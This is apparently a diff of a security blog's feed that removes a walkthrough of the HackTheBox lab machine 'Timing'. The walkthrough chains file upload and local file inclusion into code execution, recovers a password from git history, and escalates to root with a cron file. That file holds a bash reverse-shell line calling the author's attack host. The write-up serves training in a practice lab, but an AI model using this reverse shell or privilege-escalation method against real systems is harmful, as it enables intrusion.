-#------------------------------------------------------------------------------------
-#   A script for generating the possible image upload paths in Timing (HackTheBox).
-# To be executed immediately after uploading a file named "test.jpg", then pipe
-# the output to file which you can use as bruteforce wordlist with tools like ffuf.
-#   This was tested with timezone set to WAT (UTC + 1), so you may need to modify the
-# script to suit yours.
-#                                                   Author: https://4g3nt47.github.io
-#------------------------------------------------------------------------------------
-</span>
-<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">time</span>
-<span class="kn">from</span> <span class="nn">hashlib</span> <span class="kn">import</span> <span class="n">md5</span>
-
-<span class="n">stime</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="p">())</span> <span class="c1"># The starting time
-</span><span class="n">filename</span> <span class="o">=</span> <span class="s">"test.jpg"</span> <span class="c1"># The basename of the file uploaded.
-</span>
-<span class="k">def</span> <span class="nf">hashstr</span><span class="p">(</span><span class="n">val</span><span class="p">):</span> <span class="c1"># Return an md5 hash of a string.
-</span>  <span class="k">return</span> <span class="n">md5</span><span class="p">(</span><span class="n">val</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">"UTF-8"</span><span class="p">)).</span><span class="n">hexdigest</span><span class="p">()</span>
-
-<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">300</span><span class="p">):</span> <span class="c1"># Generate candidates for 5 minute
-</span>  <span class="n">path</span> <span class="o">=</span> <span class="s">"images/uploads/"</span> <span class="o">+</span> <span class="n">hashstr</span><span class="p">(</span><span class="s">"$file_hash"</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">stime</span><span class="p">))</span> <span class="o">+</span> <span class="s">"_"</span> <span class="o">+</span> <span class="n">filename</span>
-  <span class="k">print</span><span class="p">(</span><span class="n">path</span><span class="p">)</span>
-  <span class="n">stime</span> <span class="o">-=</span> <span class="mi">1</span><span class="p">;</span> <span class="c1"># Go back 1 second in time
-</span></pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>I probably need to sync my time with the box, but I don’t see NTP running on the host (port 123). So I generated a bind shell because the host is blocking all outgoing connections (I figured this out after a couple of tests) and saved it as <code class="language-plaintext highlighter-rouge">test.jpg</code>;</p>
-
-<p><img src="/assets/img/20220210000559.png" alt="" /></p>
-
-<p>I uploaded it to the site, and immediately run the <code class="language-plaintext highlighter-rouge">make_paths.py</code> script to generate possible paths and save as <code class="language-plaintext highlighter-rouge">paths.txt</code>. I then used <code class="language-plaintext highlighter-rouge">ffuf</code> to find the valid path with threads set to <code class="language-plaintext highlighter-rouge">1</code> because the order is important. It worked!</p>
-
-<p><img src="/assets/img/20220210001107.png" alt="" /></p>
-
-<p>Now that I can write files, and find out exactly where they are stored, I can use the previously discovered LFI on <code class="language-plaintext highlighter-rouge">image.php</code> to run my own code;</p>
-
-<p><img src="/assets/img/20220210001337.png" alt="" /></p>
-
-<p>This gave me a shell on the box as <code class="language-plaintext highlighter-rouge">www-data</code>;</p>
-
-<p><img src="/assets/img/20220210001353.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="user">User</h3>
-<p><br /></p>
-
-<p>In the root of the web app, I found a database password in the file <code class="language-plaintext highlighter-rouge">db_conn.php</code>, and there is a MySQL service running locally on port <strong>3306</strong>;</p>
-
-<p><img src="/assets/img/20220210001644.png" alt="" /></p>
-
-<p>I found the hashed password of the <strong>admin</strong> user in the database, but it was taking too long to crack with <code class="language-plaintext highlighter-rouge">john</code>, so I moved on.</p>
-
-<p><img src="/assets/img/20220210001837.png" alt="" /></p>
-
-<p>Listing the <code class="language-plaintext highlighter-rouge">/home</code> directory showed that a local user named <strong>aaron</strong> exist. Testing his password for the web app on the local account (<em>aaron</em>) did not work.</p>
-
-<p>Looking through the filesystem, I found an interesting file at <code class="language-plaintext highlighter-rouge">/opt/source-files-backup.zip</code>, which I extracted to <code class="language-plaintext highlighter-rouge">/dev/shm</code> for analysis. The file appears to contain the backup of all the source code of the web app. A <code class="language-plaintext highlighter-rouge">.git</code> directory exists in the root of the folder, which indicate it’s a git repository.</p>
-
-<p>The box has <code class="language-plaintext highlighter-rouge">git</code> installed, so I ran <code class="language-plaintext highlighter-rouge">git log</code> to show previous commits;</p>
-
-<p><img src="/assets/img/20220210002452.png" alt="" /></p>
-
-<p>The commit message of the last commit looks interesting, so I ran <code class="language-plaintext highlighter-rouge">git diff</code> on it to see the changes made. I was rewarded with a password;</p>
-
-<p><img src="/assets/img/20220210002622.png" alt="" /></p>
-
-<p>Testing the password against the account of <strong>aaron</strong>, I gained access;</p>
-
-<p><img src="/assets/img/20220210002707.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="privesc">PrivEsc</h3>
-<p><br /></p>
-
-<p>The user <strong>aaron</strong> has <strong>sudo</strong> permissions on the file <code class="language-plaintext highlighter-rouge">/usr/bin/netutils</code>, which is a simple bash script that calls a Java program located in the home directory of the root user;</p>
-
-<p><img src="/assets/img/20220210003026.png" alt="" /></p>
-
-<p>The program is a download utility that prompts for protocol and URL. Using the HTTP protocol, I was able to download a file from my attack host. This is when I realised I could connect to my box over port <strong>80</strong>, which previously didn’t work when I was trying to gain a foothold on the box. After exiting the program, I realised that the file is downloaded to my current working directory, and saved as root. This could allow me to write to any directory I can <code class="language-plaintext highlighter-rouge">cd</code> into.</p>
-
-<p>My first attempt was to create a cron job by writing to <code class="language-plaintext highlighter-rouge">/etc/cron.d</code>. This is important because cron files do not need to have execute permission, which I can’t set because the file ownership will be assigned to root. This didn’t work because at first because I messed up the syntax of the cron file I uploaded. After some tests locally on my box, I created a file named <code class="language-plaintext highlighter-rouge">mycron</code> with the contents;</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre><span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> <span class="k">*</span> root /bin/bash <span class="nt">-c</span> <span class="s1">'bash -i &gt;&amp; /dev/tcp/10.10.16.53/443 0&gt;&amp;1'</span>
-</pre></td></tr></tbody></table></code></pre></div></div>
-
-<p>I then start a HTTP server locally on my box to host the cron file, and then moved into <code class="language-plaintext highlighter-rouge">/etc/cron.d</code> (in the target box) and download the file. I then started a listener on port <strong>443</strong>, and received a privileged reverse shell after about a minute;</p>
-
-<p><img src="/assets/img/20220210004334.png" alt="" /></p>
-
-<p><br /></p>
-
-<hr />
-<h3 id="summary">Summary</h3>
-<p><br /></p>
-
-<ul>
-  <li>Identified port <strong>22</strong> and <strong>80</strong>.</li>
-  <li>Identified a time delay in the web login when submitting valid username.</li>
-  <li>Bruteforced a file <code class="language-plaintext highlighter-rouge">/image.php</code> in the web root.
-    <ul>
-      <li>Bruteforced a GET parameter <code class="language-plaintext highlighter-rouge">img</code>, which was found to be vulnerable to LFI.</li>
-    </ul>
-  </li>
-  <li>Discovered a user named <strong>aaron</strong> that uses the password <strong>aaron</strong>.
-    <ul>
-      <li>Exploited an <em>SQL Injection</em> flaw to elevate to admin in the site.</li>
-      <li>Chained an <em>arbitrary file upload</em> and an <em>LFI</em>  flaw to gain <em>RCE</em>.</li>
-    </ul>
-  </li>
-  <li>Inside as <strong>www-data</strong>
-    <ul>
-      <li>Recovered a password in a previous git commit, which gave me access to the account of <strong>aaron</strong> over SSH.</li>
-    </ul>
-  </li>
-  <li>Inside as <strong>aaron</strong>
-    <ul>
-      <li>Identified a <em>sudo</em> permission on a script that allows for file download to working directory as root.</li>
-      <li>Used it to create a cron task by writing to <code class="language-plaintext highlighter-rouge">/etc/con.d</code> to gain code execution as root.</li>
-    </ul>
-  </li>
-</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="bruteforce" /><category term="filter bypass" /><category term="static analysis" /><category term="php" /><category term="authentication bypass" /><category term="enumeration" /><category term="sql injection" /><category term="arbitrary file upload" /><category term="git" /><category term="suid" /><category term="cron" /><summary type="html"><![CDATA[Timing is a very nice medium-rated linux box that involves a bit of static analysis on PHP files. Foothold involves quite a few steps that start with an LFI vulnerability to read source code of the application to identify a broken authentication logic, an SQL injection flaw to elevate to the website admin, and then an RCE via file upload. User access is through a password reuse, which you recover from a previous git commit. Privesc targets a custom SUID script that runs a Java program, which allows you to write arbitrary files in any directory you can enter.]]></summary></entry></feed>
+</ul>]]></content><author><name></name></author><category term="hackthebox" /><category term="hackthebox" /><category term="linux" /><category term="web" /><category term="exiftool" /><category term="imagemagick" /><category term="neofetch" /><category term="sudo" /><summary type="html"><![CDATA[Meta is a pretty easy medium-rated box on HackTheBox. It starts with a website that allows for image uploads, which can be exploited to gain RCE using an exiftool CVE. User access is also another CVE targeting ImageMagick, and privesc to root is through a vulnerable sudo configuration on neofetch, which allows you to hijack the configuration file used by the program.]]></summary></entry></feed>
